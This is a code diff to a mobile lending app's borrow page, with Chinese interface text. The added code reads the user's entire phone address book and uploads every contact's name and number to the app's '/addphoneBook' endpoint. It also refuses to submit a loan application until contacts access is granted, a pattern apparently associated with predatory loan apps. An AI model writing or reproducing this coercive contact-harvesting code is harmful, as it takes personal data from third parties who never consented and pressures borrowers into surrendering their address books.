@@ -71,6 +71,8 @@
 		var idx = -1;
 		var handlingRate = 30;
 		var amountMax = 800;
+		var contacts = [];
+		var purview = false;
 		function changeBorrow(){
 			var handlingFee = Math.floor(Number($('.borrowAmount').val())*handlingRate)/100
 			$('.handlingFee').text(handlingFee+'元');
@@ -94,13 +96,61 @@
 			});
 			mui.plusReady(function() {
 				var userInfo = JSON.parse(plus.storage.getItem('userInfo'));
-				POST({
+				function getAddressList(success){
+					plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
+						addressbook.find(["displayName", "phoneNumbers"], function(res) {
+							contacts = res;
+							success(userInfo.id);
+						}, function() {
+							mui.alert('获取通讯录失败 ,重新获取', '提示', '确定', getAddressList);
+							return;
+						}, {
+							multiple: true
+						});
+					}, function(e) {
+						mui.alert('获取通讯录失败 ,重新获取', '提示', '确定', getAddressList);
+						return;
+					});
+				}
+				// 提交通讯录信息
+				function submitAddrlist(id){
+					var list = [], k = 0;
+					for (k in contacts) {
+						var contact = contacts[k];
+						var phoneNumbers = contact.phoneNumbers
+						for (var k1 in phoneNumbers) {
+							var item = {
+								customerId: id,
+								bookName: contact.displayName,
+								bookPhone: phoneNumbers[k1].value,
+								bookTimes: 10
+							}
+							list.push(item)
+						}
+					}
+					POST({
+						url: '/addphoneBook',
+						data: { data: JSON.stringify(list) },
+						success: function(res){
+							loadData();
+						}
+					})
+				}
+				function loadData(){
+					POST({
 						url: '/getBorrowAmount',
 						data: {
 							customerId: userInfo.id
 						},
 						success: function(res){
 							if(res.code == 0){
+							
+								if(res.data.status==0){
+									getAddressList(submitAddrlist);
+									purview = false;
+									return;
+								}
+								purview = true;
 								$(".termDay").text(res.data.termDay+"天")
 							
 								$(".bankNo").text(res.data.bankNo);
@@ -116,6 +166,10 @@
 							}
 						}
 					})
+				}
+				loadData();
+
+					
 				
 				mui('body').on('tap', '.submit', function() {
 					if(!$('.agree')[0].checked){
@@ -129,7 +183,10 @@
 							return;
 						}
 
-					
+					if(!purview){
+						mui.alert('读取不到手机通讯录，请手动开启通讯录读取权限', function(){})
+						return;
+					}
 					var userInfo = JSON.parse(plus.storage.getItem('userInfo'));
 					POST({
 						url: '/appBorrowInfo',
